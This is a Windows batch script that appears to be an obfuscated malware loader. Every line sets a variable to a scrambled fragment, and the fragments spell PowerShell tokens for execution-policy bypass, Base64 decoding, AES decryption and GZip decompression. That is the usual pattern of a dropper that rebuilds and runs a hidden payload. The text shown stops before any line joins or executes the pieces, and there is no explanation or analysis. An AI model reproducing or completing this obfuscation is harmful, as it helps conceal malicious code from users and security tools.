@echo off
set "WROgvTwruy=q = "
set "qyJULlYhOQ=Secu"
set "whXTBAKAyG=, (,"
set "wkSoIpDSSD=)($v"
set "RbVjUPsjpR=ptor"
set "ogYribpNXV=.Cre"
set "jmutsjIiGk=sGUc"
set "YoqRgwFTjP=WbqD"
set "eXrtyxgekY=Disp"
set "hFXZIpHliV=)))"
set "jrPovTnjut=tryP"
set "ULskvmlUap=daeR"
set "CJwItTiLfg=ddin"
set "NkVNmsdrvC=);$n"
set "BOxcypBSeh=m.IO"
set "QZxewdNRAo=tion"
set "JUtfUXQGbw=nirt"
set "IsaSGuIXlz=V = "
set "QaEgstZSek=.Len"
set "OpTFiCXTNS= = ["
set "DMIPdlRDeL=m.Re"
set "ujAoDPZHAM=0O+g"
set "aKufHkoYSW=oArr"
set "BNhnXOgMwb=raph"
set "joOVzMUcbi=comp"
set "qkWFDHJjaP=y.Pa"
set "DyIVqfKeIq=ct S"
set "hVfTJpZkIf=brea"
set "hzjnBFaWiX=.Con"
set "qBBLAQyCve=gth)"
set "kTTzlOOhgF=BC;$"
set "IYTRtuFTLs='[-1"
set "LGvGDArToh=)) {"
set "GdTSNwYsqF=u.En"
set "SojpbWqWCc=yste"
set "tfzWxNTNaj='dqR"
set "onDNxRztDL=v4Ir"
set "JakDzomhla=;$aq"
set "vSBvawKliN=.Cry"
set "ybfudGNJpP=UGTu"
set "pizzFohEPF=-joi"
set "WyqkzfgFrl=16] "
set "IEHuIdTkHu=OyzA"
set "bgzMKGvTUw=ring"
set "RjRagtSaxY=ose("
set "DCGThznOZy=.GZi"
set "QfkejTWgIE=bypa"
set "yZcPUKHRZK=('da"
set "blUpzWazic=txuH"
set "VrBxTNFIsD== $q"
set "MRCFGBXLir=ateD"
set "bmMGBhicXr='txe"
set "AVCBrmIson=lit("
set "NkiQWOBAgT=ddin"
set "fVSPqHItpS=bstr"
set "ORdqoyXoTp=y.Ci"
set "PIxCNSqgGL=oint"
set "pYPhZQPZbO=]::C"
set "GKxPpCMogV=th('"
set "IIhEuDzADr=rt]:"
set "avokUEpuJy=ion."
set "umyEHxGKiR=NtWk"
set "LwDpMVNBsA=oryS"
set "wmLjIsTNPX=ck($"
set "zjQeSdwjiN=cWG."
set "pxjPzASdKR=7;$q"
set "ZuzNIxjDox=:: '"
set "xFCCPFBVwL=txuH"
set "cARCywskEB=$eUq"
